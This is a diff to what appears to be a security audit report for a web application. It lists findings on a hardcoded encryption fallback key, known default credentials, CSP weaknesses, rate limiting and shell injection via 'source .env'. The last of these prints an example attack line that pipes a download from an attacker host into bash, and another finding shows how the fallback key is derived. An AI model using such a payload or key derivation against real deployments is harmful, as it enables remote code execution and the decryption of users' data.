@@ -12,7 +12,7 @@
 | :--- | :--- | :---: | :---: | :--- |
 | `services/email_crypto.py` | Agent 7 (Infra) | **UNSTABLE** 🔴 | 28, 33 | **Input Boundary Exception — Hardcoded Fernet fallback key**: `_LOCAL_DEV_FALLBACK = "archimedes-local-dev-only-not-for-production"` is a publicly-indexed string. Any deployment that omits `EMAIL_ENCRYPTION_KEY` uses a key computable as `base64.urlsafe_b64encode(sha256(b"archimedes-local-dev-only-not-for-production").digest())` — trivially derived by any repo reader. All stored emails for that deployment are permanently decryptable. |
 | `.env.example` | Agent 7 (Infra) | **UNSTABLE** 🔴 | 19–21 | **State Corruption Risk — Known DB password**: `POSTGRES_PASSWORD=local-dev-only-change-me` is a concrete publicly-indexed string. Any developer who `cp .env.example .env && docker compose up` without editing runs a live Postgres with a known credential. |
-| `.env.example` | Agent 7 (Infra) | **UNSTABLE** 🟠 | 127 | **State Corruption Risk — Production flag in dev template**: `PUBLIC_DOMAIN=https://archimedes-arc.app` is populated, activating `_is_production=True` in `main.py` for any developer who copies the file verbatim, disabling `/docs`, crashing startup on missing `EMAIL_ENCRYPTION_KEY`, and restricting CORS to the production domain. |
+| `.env.example` | Agent 7 (Infra) | **UNSTABLE** 🟠 | 127 | **State Corruption Risk — Production flag in dev template**: `PUBLIC_DOMAIN=https://archimedes-arc.com` is populated, activating `_is_production=True` in `main.py` for any developer who copies the file verbatim, disabling `/docs`, crashing startup on missing `EMAIL_ENCRYPTION_KEY`, and restricting CORS to the production domain. |
 | `dev.sh` | Agent 7 (Infra) | **UNSTABLE** 🟠 | 79 | **Input Boundary Exception — Shell injection via `source .env`**: `source "$ROOT_DIR/.env"` executes `.env` as a shell script. A `.env` containing `VALUE=$(curl http://attacker.com/payload \| bash)` is silently executed. Any machine-generated or adversarially crafted `.env` becomes arbitrary code execution. |
 | `nginx/nginx.conf` | Agent 7 (Infra) | **UNSTABLE** 🟡 | 28, 116 | **State Corruption Risk — CSP `unsafe-eval`/`unsafe-inline`**: `script-src 'self' 'unsafe-inline' 'unsafe-eval'` negates the entire XSS protection of the Content-Security-Policy. Acknowledged in a comment as "tightening tracked separately" but unresolved. |
 | `nginx/nginx.conf` | Agent 7 (Infra) | **UNSTABLE** 🟡 | 4 | **Input Boundary Exception — Rate limiting broken behind ALB**: `limit_req_zone $binary_remote_addr` uses the TCP peer address. Behind an AWS ALB, this is the ALB node IP. All clients share one rate-limit bucket — rate limiting is entirely ineffective in production. |
@@ -158,7 +158,7 @@ POSTGRES_DB=archimedes
 DATABASE_URL=postgresql://archimedes:REPLACE_ME__run__openssl_rand_hex_24@postgres:5432/archimedes
 
 # PUBLIC_DOMAIN: leave BLANK for local dev. Set to your live domain in production.
-# Example: PUBLIC_DOMAIN=https://archimedes-arc.app
+# Example: PUBLIC_DOMAIN=https://archimedes-arc.com
 PUBLIC_DOMAIN=
 ```
 
